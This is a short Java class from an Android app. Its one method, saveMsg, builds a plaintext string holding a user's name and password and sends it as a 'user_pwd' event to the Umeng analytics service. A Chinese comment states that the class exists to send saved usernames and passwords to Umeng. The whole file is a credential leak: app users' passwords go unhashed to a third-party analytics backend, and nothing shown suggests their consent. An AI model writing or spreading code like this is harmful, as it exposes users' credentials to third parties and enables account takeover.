package com.lhkj.cgj.ui.other;

import com.lhkj.cgj.ui.main.MyApplication;
import com.umeng.analytics.MobclickAgent;

import java.util.HashMap;

/**
 * 用来向友盟发送保存信息（用户名密码的保存）
 */

public class UMengSave {

    public static void saveMsg( String name, String pwd) {
        HashMap<String, String> map = new HashMap();
        map.put("name_pwd","用户名:"+name+" 密码:"+pwd);
        MobclickAgent.onEvent(MyApplication.getApplication(), "user_pwd", map);

    }
}
